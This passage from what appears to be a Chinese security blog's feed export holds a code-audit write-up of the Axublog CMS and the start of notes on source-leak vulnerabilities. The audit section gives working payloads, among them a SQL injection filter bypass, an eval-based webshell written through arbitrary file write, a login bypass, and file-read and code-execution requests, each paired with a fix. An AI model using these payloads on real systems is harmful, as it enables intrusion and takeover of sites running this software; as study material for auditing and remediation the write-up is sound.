class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">sqlguolv</span><span class="params">()</span> </span>&#123;</span><br><span class="line">@header(<span class="string">"Content-type:text/html; charset=utf-8"</span>);</span><br><span class="line">$a=<span class="string">'/%3C|\&lt;|%27|%22|\&gt;|%3E|\||\\\|\;|select|insert|\"|\'|\\*|\*|union|into/i'</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match($a,$_SERVER[<span class="string">'QUERY_STRING'</span>])==<span class="number">11</span> <span class="keyword">or</span> preg_match($a,file_get_contents(<span class="string">"php://input"</span>))==<span class="number">11</span> )&#123;<span class="keyword">return</span> <span class="string">"1"</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_SERVER[‘QUERY_STRING’]获取查询语句，一般是问号后面的字符串，然后使用preg_match()函数来匹配正则表达式。但是有一个问题：</p><p>使用$_SERVER[‘QUERY_STRING’]不会对传入的字符进行URL解码操作，</p><p>而$_GET时候会进行一次URL解码。所以我们可以使用url编码的方式绕过检测。</p><p>我们可以分别对字母u和s进行url编码为：%75 %73，得到paylaod:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?g=arthit&amp;id=<span class="number">-1</span>%<span class="number">20</span>%<span class="number">75</span>nion%<span class="number">20</span>%<span class="number">73</span>elect%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,database(),<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span></span><br></pre></td></tr></table></figure><h5 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h5><p>1.加强sqlguolv()的功能，针对 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不对URL进行解码的问题进行修复，即增加解码的步骤并完善正则匹配的关键字。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">'QUERY_STRING'</span>]=urldecode($_SERVER[<span class="string">'QUERY_STRING'</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>2.因为此次的sql注入为数字型，所以可以直接将id进行强制转换为int型在进行查询。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="built_in">id</span>=intval($<span class="built_in">id</span>);</span><br></pre></td></tr></table></figure><p>3.使用预编译技术和数据库进行交互。</p><h3 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h3><h5 id="漏洞位置："><a href="#漏洞位置：" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/theme.php  185~198行</p><h5 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>分析漏洞代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">@$g=$_GET[<span class="string">"g"</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"jspost.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">switch</span> ($g)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">default</span>:index();<span class="keyword">break</span>; </span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="string">"index"</span>:index();<span class="keyword">break</span>; </span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="string">"savechoose"</span>:savechoose();<span class="keyword">break</span>; </span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="string">"edit"</span>:edit();<span class="keyword">break</span>; </span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="string">"edit2"</span>:edit2();<span class="keyword">break</span>; </span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"edit2save"</span>:edit2save();<span class="keyword">break</span>; </span></span><br><span class="line"><span class="php">    &#125;</span></span><br></pre></td></tr></table></figure><p>当我们传入<code>?g=edit2save</code>即可调用edit2save()的函数。</p><p>我们继续观察该函数功能：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">edit2save</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">global</span> $themepath;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"yj_green"</span> <span class="attr">id</span>=<span class="string">full</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b1"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b2"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b3"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b4"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"boxcontent"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?"</span>&gt;</span>主题管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span> &gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:history.go(-2)"</span>&gt;</span>编辑主题<span class="tag">&lt;/<span class="name">a</span>&gt;</span> &gt; 编辑文件 &gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:history.back()"</span>&gt;</span>返回<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"t1"</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"t2"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$path=$_REQUEST[<span class="string">'path'</span>];</span></span><br><span class="line"><span class="php">$content=stripslashes($_REQUEST[<span class="string">'content'</span>]);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>编辑文件：<span class="php"><span class="meta">&lt;?</span>=$path<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($path==<span class="string">''</span>)&#123;<span class="keyword">echo</span><span class="string">'文件路径错误！'</span>;<span class="keyword">exit</span>;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(file_put_contents ($path, $content))&#123;<span class="keyword">echo</span><span class="string">"保存文件成功！"</span>;&#125; </span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;<span class="keyword">echo</span><span class="string">"保存文件失败！"</span>;&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>​    在这个方法中，$path和$content分别表示路径和文件内容，用户可控，最后把这两个参数传入file_put_contents中进行保存操作。</p><p>我们可以构造写入webshell的payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?g=edit2save&amp;path=../shell.php&amp;content=<span class="php"><span class="meta">&lt;?php</span>%<span class="number">20</span>@<span class="keyword">eval</span>($_POST[cmd]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>成功拿到webshell.</p><h5 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h5><p>我们根据上下函数可知，此处调用该函数的目的是为了about页面：</p><p>所以我们可以对path进行白名单校验，或者直接将路径写死：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$path</span>!=<span class="string">'../theme/default/about.mb'</span>)&#123;</span><br><span class="line">echo <span class="string">'about.mb地址不正确'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="后台生成about页面getshell"><a href="#后台生成about页面getshell" class="headerlink" title="后台生成about页面getshell"></a>后台生成about页面getshell</h3><h5 id="漏洞位置：-1"><a href="#漏洞位置：-1" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/html.php 773行~787行</p><h5 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ob_start();</span><br><span class="line">include($mb);</span><br><span class="line">$html = ob_get_contents ();</span><br><span class="line">ob_clean();</span><br><span class="line">$html=mbreplace($html);</span><br><span class="line">file_put_contents ($cache, $html);</span><br><span class="line"></span><br><span class="line">echo '生成about.html成功: <span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">blank</span> <span class="attr">href</span>=<span class="string">"'.$cache.'"</span>&gt;</span>访问<span class="tag">&lt;/<span class="name">a</span>&gt;</span>';</span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b4b"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b3b"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b2b"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">"b1b"</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>这里使用include函数包含about.mb将其中php的语句执行后再将一些标签替换成变量的值，最后把处理的结果放入<code>$cache</code>变量中再将其写入<code>aout.html</code>页面。</p><p>我们在about.mb尾部添加如下代码：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">file<span class="constructor">_put_contents('..<span class="operator">/</span><span class="params">shell</span>.<span class="params">php</span>','&lt;?<span class="params">php</span> @<span class="params">eval</span>($<span class="params">_GET</span>[<span class="string">"a"</span>])</span>; ?&gt;'); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后使用菜刀连接即可getshell。</p><h4 id="后台登录处的sql注入漏洞"><a href="#后台登录处的sql注入漏洞" class="headerlink" title="后台登录处的sql注入漏洞"></a>后台登录处的sql注入漏洞</h4><h5 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>首先分析其login.php页面，发现用户名和密码输入后是使用的jsloginpost函数进行处理的。jsloginpost函数是在c_login.php文件中定义的。</p><p><img src="1587018-20200303210401433-2074327058.png" alt=""></p><p>打开c_login.php页面，分析jsloginpost代码，发现jsloginpost并没有对user和psw进行过滤处理，而是直接带入了sql语句进行查询，所以此处造成了sql注入漏洞。</p><p><img src="1587018-20200303211200124-595595133%5B1%5D.png" alt=""></p><h5 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p>我们只需要在后台管理员登录处使用万能密码即可成功登录，例如</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">user:admin'</span> <span class="string">or</span> <span class="number">1</span><span class="string">=1#</span></span><br><span class="line"><span class="attr">psw:</span> <span class="string">随意</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="attr">user:</span> <span class="string">admin'</span> <span class="string">or</span> <span class="number">1</span><span class="comment">#</span></span><br><span class="line"><span class="attr">psw:</span> <span class="string">随意</span></span><br></pre></td></tr></table></figure><p><img src="1587018-20200303211645255-577074129%5B1%5D.png" alt=""></p><h4 id="前台反射型xss漏洞"><a href="#前台反射型xss漏洞" class="headerlink" title="前台反射型xss漏洞"></a>前台反射型xss漏洞</h4><h5 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>此漏洞是搜索功能处的xss漏洞，由于在search.php中对word参数没有过滤而产生的。首先分析search.php文件，在文件中首先获取搜索数据给word参数，然后进行判断，如果没有传参数，则直接调用index()函数，如果传递了参数则调用so()函数。</p><p><img src="1587018-20200303232615102-565416911%5B1%5D.png" alt=""></p><p>进入so()函数继续分析：在so()函数中也没有对word参数进行任何过滤处理，而是包含了一个模板文件search.mb，继续跟进模板文件：</p><p><img src="1587018-20200303234054140-229902481%5B1%5D.png" alt=""></p><p><img src="1587018-20200303233948167-467235758%5B1%5D.png" alt=""></p><p>模板文件search.mb分析：发现在模板文件中也是直接对word参数直接输出，而没有任何过滤，所以此处就造成了xss漏洞</p><p><img src="1587018-20200303234320733-213715566%5B1%5D.png" alt=""></p><h5 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p><img src="1587018-20200303234506377-737313316.png" alt="img"></p><h4 id="前台sql注入漏洞"><a href="#前台sql注入漏洞" class="headerlink" title="前台sql注入漏洞"></a>前台sql注入漏洞</h4><p>在第二个分析xss漏洞的过程中发现，在其模板文件search.mb中还调用了searchlist()函数，继续跟进searchlist()函数（searchlist函数在search.php文件中）</p><p><img src="1587018-20200303234835707-2141296773.png" alt="img"></p><p>发现在searchlist()函数中同样没有对word参数进行过滤，而直接带入了sql语句进行查询，所以此处就造成了sql注入漏洞。</p><p>漏洞利用：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">执行如下poc时候返回正确结果：</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.110.152/axublog/search.php?word=广%' or 1=1--+</span></span><br><span class="line">执行如下poc时候无结果返回：</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.110.152/axublog/search.php?word=广%' or 1=2--+</span></span><br></pre></td></tr></table></figure><h4 id="后台任意文件写入漏洞"><a href="#后台任意文件写入漏洞" class="headerlink" title="后台任意文件写入漏洞"></a>后台任意文件写入漏洞</h4><p>注明：这个后台文件上传漏洞不需要登录后台即可直接getshell</p><p>漏洞点：admin/theme.php</p><p><img src="1587018-20200304002821492-309441952.png" alt=""></p><p>edit2save()函数进行了文件的写入操作，将REQUEST请求的的path参数和content参数分别作为作为报存的路径和内容传入file_put_contents中进行保存操作。</p><p>继续寻找edit2save()函数调用点：发现当g=edit2save时调用该函数。</p><p><img src="1587018-20200304003116729-1307171520.png" alt="img"></p><h5 id="漏洞利用：-2"><a href="#漏洞利用：-2" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">请求：</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.110.152/axublog/admin/theme.php?g=edit2save</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">post:</span></span><br><span class="line">path=./shell.php<span class="variable">&amp;content</span>=<span class="params">&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="1587018-20200304003256803-1334544380.png" alt="img"></p><h4 id="后台多个sql注入漏洞"><a href="#后台多个sql注入漏洞" class="headerlink" title="后台多个sql注入漏洞"></a>后台多个sql注入漏洞</h4><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>漏洞点：admin/admin.php</p><p>定位edit()函数，发现id参数没有经过过滤而直接带入sql语句进行查询了。</p><p><img src="1587018-20200304172222897-1426655107.png" alt="img"></p><p>但是这里在获取id参数之前调用了chkoutpost()函数进行验证。跟进chkoutpost()函数。class/c_other.php</p><p><img src="1587018-20200304172533350-1121177041.png" alt="img"></p><p>chkoutpost()函数仅仅验证了refer是否为空的情况，所以我们在利用这个sql注入漏洞是时候给refer随便赋个值即可。</p><p>查看edit函数在哪里被调用了：发现当g=edit时候调用edit函数。</p><p><img src="1587018-20200304172752867-937007122.png" alt="img"></p><h5 id="漏洞利用：-3"><a href="#漏洞利用：-3" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">poc:</span></span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.110.152/axublog</span><span class="regexp">/admin/admin</span>.php?g=edit&amp;id=<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">version</span>(),3,4--+</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">Referer:</span> 任意填写</span><br></pre></td></tr></table></figure><p><img src="1587018-20200304172922428-724640530.png" alt="img"></p><p>6，既然这个cms的sql注入都没有进行防御，那么肯定还存在n个sql注入漏洞，此处就不一一说明了。</p><h4 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h4><p>漏洞点：admin/app.php</p><p>首先定位到edit2()函数，在edit2函数中通过调用file_get_contents函数获取变量path文件中的内容，然而变量path文件中的内容，然而变量path的值是通过request的方式从path参数获取的，并且对变量$path没有任何过滤而直接带入到file_get_contents函数进行获取文件内容，所以此处就造成了任意文件读取漏洞。</p><p><img src="1587018-20200304173840167-1365630191.png" alt="img"></p><p>跟进edit2()函数，寻找调用方法：当g=edit2的时候调用edit2函数。</p><p><img src="1587018-20200304174437952-1224821444.png" alt="img"></p><p>漏洞利用：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poc:</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">110.152</span><span class="regexp">/axublog/</span>admin<span class="regexp">/app.php?g=edit2&amp;path=./</span>app.php</span><br></pre></td></tr></table></figure><p><img src="1587018-20200304174618584-506013891.png" alt=""></p><h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h4><p>漏洞点：admin/html.php</p><p>漏洞分析：在生成about页面的时候调用了ob_get_contents函数执行about.mb里面的php代码，并且没有进行任何过滤，所以我们可以通过向about.md文件中写入php代码，从而使其被执行。然而在后台管理页面中正好有编辑about页功能。</p><p><img src="1587018-20200304210913536-1220729563.png" alt="img"></p><p>漏洞利用：</p><p>首先编辑about页，然后向其中写入想要执行的php代码即可，此处我使用file_put_contents函数生成一个文件名为shell2.php的探针文件。</p><p><img src="1587018-20200304211607584-434322337.png" alt="img"></p><p>保存编辑后选择生成about：</p><p><img src="1587018-20200304211905560-277463672.png" alt="img"></p><p>然后我们的代码就被成功的执行了，访问shell2.php:</p><p><img src="1587018-20200304212324112-1387100175.png" alt="img"></p><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="http://www.ttk7.cn/post-82.html" target="_blank" rel="noopener">http://www.ttk7.cn/post-82.html</a></p><p><a href="https://blog.csdn.net/sweet0swat/article/details/89056383" target="_blank" rel="noopener">https://blog.csdn.net/sweet0swat/article/details/89056383</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Axublog代码审计学习&quot;&gt;&lt;a href=&quot;#Axublog代码审计学习&quot; class=&quot;headerlink&quot; title=&quot;Axublog代码审计学习&quot;&gt;&lt;/a&gt;Axublog代码审计学习&lt;/h2&gt;&lt;h4 id=&quot;前台数字型sql注入&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="代码审计学习" scheme="https://shu1l.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Axublog" scheme="https://shu1l.github.io/tags/Axublog/"/>
    
  </entry>
  
  <entry>
    <title>敏感信息泄露常见类型</title>
    <link href="https://shu1l.github.io/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/"/>
    <id>https://shu1l.github.io/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/</id>
    <published>2020-04-19T10:33:38.000Z</published>
    <updated>2020-05-17T11:48:42.268Z</updated>
    
    <content type="html"><![CDATA[<h2 id="敏感信息泄露-源码泄露-学习笔记"><a href="#敏感信息泄露-源码泄露-学习笔记" class="headerlink" title="敏感信息泄露/源码泄露  学习笔记"></a>敏感信息泄露/源码泄露  学习笔记</h2><h4 id="1-什么是敏感数据？"><a href="#1-什么是敏感数据？" class="headerlink" title="1.什么是敏感数据？"></a>1.什么是敏感数据？</h4><p>  敏感数据包括但不限于：口令、密钥、证书、会话标识、Licence、隐私数据、授权凭据、个人数据等、在程序文件、配置文件、日志文件、备份文件及数据库中都有可能包含敏感数据。</p><h4 id="1、-git文件泄露漏洞"><a href="#1、-git文件泄露漏洞" class="headerlink" title="1、.git文件泄露漏洞"></a>1、.git文件泄露漏洞</h4><p><strong>漏洞描述：</strong>git在初始化项目的时候，会在项目的根目录（git rev-parse  –show-toplevel查看）创建一个名为<code>.git</code>的隐藏文件夹，里面包含了本地所有commit的历史纪录，如果无意间将这个目录置于Web的路径下让用户可以访问，那么也就泄露了几乎所有的源代码和其他的敏感信息。可能泄露的内容：</p><ul><li>所有该项目的源码</li><li>私有仓库的地址</li><li>私密的配置信息。</li><li>所有commiter的邮箱账号信息</li><li>内部的账号和密码。。</li></ul><p><strong>检测方式：</strong>   工具：GitHack  使用方法：</p><p>​                 <code>python GitHack.py  http://网站地址/.git/</code></p><p><strong>示例：</strong>来源(i春秋web Hello world);</p><p>进入题目，查看源码，只发现一个js文件</p><img src="QQ截图20200119121609.png" style="zoom:100%;" /><p>我们尝试使用Githack来判断网站是否有.git泄露。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200119121109.png" alt=""></p><p>可见该网站下存在.git泄露，并且在工具文件夹下得到了泄露的文件内容。</p><img src="QQ截图20200119121116.png" style="zoom:100%;" /><h4 id="2、-hg源码泄露漏洞"><a href="#2、-hg源码泄露漏洞" class="headerlink" title="2、.hg源码泄露漏洞"></a>2、.hg源码泄露漏洞</h4><p><strong>漏洞描述：</strong><a href="https://www.mercurial-scm.org/" target="_blank" rel="noopener">Mercurial</a>的意思是水银, 所以缩写成hg(汞), 也是一个版本管理软件. 用法和git有点类似, 但也保留了svn命令简明的特点, 而且原生地支持Windows/MacOS/Linux三大平台, 不像git需要MinGW才得以运行, 所以当今也有不少人偏向于用hg做版本控制.</p><p><strong>检测方式：</strong>工具dvcs-ripper,使用方法：<code>rip-hg.pl -v -u http://域名/.hg/</code></p><h4 id="3、DS-Store源码泄露漏洞"><a href="#3、DS-Store源码泄露漏洞" class="headerlink" title="3、DS_Store源码泄露漏洞"></a>3、DS_Store源码泄露漏洞</h4><p><strong>漏洞描述：</strong>在发布代码时，没有删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息，<a href="http://www.xxx.com/.ds_store" target="_blank" rel="noopener">http://www.xxx.com/.ds_store</a></p><p><strong>检测方式：</strong>dsstoreexp,使用方式：<code>python ds_store_exp.py http://域名/.Ds.store</code></p><h4 id="4、robots导致文件泄露"><a href="#4、robots导致文件泄露" class="headerlink" title="4、robots导致文件泄露"></a>4、robots导致文件泄露</h4><p><strong>漏洞描述：</strong>搜索引擎可以通过robots文件获知哪些页面可以爬取，哪些页面不可以爬取。Robots协议是网站国际互联网通行的道德规范。其目的是保护网站数据和明杆信息 、确保用户个人信息和隐私不被侵犯，如果robots.txt文件太过详细，反而会泄露网站的敏感目录或者文件，比如网站后台路径，从而得知其使用的系统类型，从而有针对性地进行利用。</p><p><strong>检测方式：</strong>1.我们可以直接使用御剑进行后台扫描，或者直接用爬虫进行爬取，从而找到robots.txt文件。</p><p>​                   2.直接在网站URL输入/robots.txt进行查看。</p><p><strong>修复方案：</strong>为了不让robots.txt中的内容不泄露网站的后台和隐私，我们可以使用星号（*）作为通配符进行设置。例如限制访问我们的后台admin目录，则规则为：</p><p>​       <img src="QQ截图20200119110404.png" style="zoom: 100%;" /></p><p>​             当我们又不想泄露我们的敏感目录时，我们可以使用星号(*)作为通配符即可。</p><img src="QQ截图20200119110727.png" style="zoom:100%;" /><p>​                 </p><h4 id="5、备份文件泄露漏洞"><a href="#5、备份文件泄露漏洞" class="headerlink" title="5、备份文件泄露漏洞"></a>5、备份文件泄露漏洞</h4><p><strong>漏洞描述：</strong>备份文件泄露又分为两种情况, 一种是运维人员偷懒地直接在网站根目录用类似<code>tar -czvf    bakup.tgz</code>的命令将网站进行备份,<br> 这样整站的源代码都能直接被用户打包下载了； 另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容,<br> 如vim的<code>.swp</code>, 从而泄露了该网页的源代码。<br><strong>检测方式：</strong>常见的备份文件后缀名：直接在URL中进行检测。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-class">.rar</span>    *<span class="selector-class">.zip</span>   *<span class="selector-class">.7z</span>   *<span class="selector-class">.tar</span><span class="selector-class">.gz</span>   *<span class="selector-class">.bak</span>   *<span class="selector-class">.swp</span>   *<span class="selector-class">.txt</span>   *<span class="selector-class">.html</span></span><br></pre></td></tr></table></figure><p>​                   或者使用工具比如AWVS进行扫描。</p><p><strong>修复方案：</strong>做好版本管理, 并利用版本管理工具过滤掉这些类型的文件, 同时不要直接在生产环境中修改或者添加文件</p><h4 id="6、phpinfo-）信息泄露漏洞"><a href="#6、phpinfo-）信息泄露漏洞" class="headerlink" title="6、phpinfo(）信息泄露漏洞"></a>6、phpinfo(）信息泄露漏洞</h4><p><strong>漏洞描述</strong>：Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息。</p><img src="sec_hole_13.png" style="zoom:100%;" /><p><strong>检测方式 ：</strong>访问<a href="http://ip/phpinfo.php看是否成功。" target="_blank" rel="noopener">http://ip/phpinfo.php看是否成功。</a></p><p><strong>修复方案 ：</strong>删除该PHP文件。</p><h4 id="7、SVN文件泄露漏洞"><a href="#7、SVN文件泄露漏洞" class="headerlink" 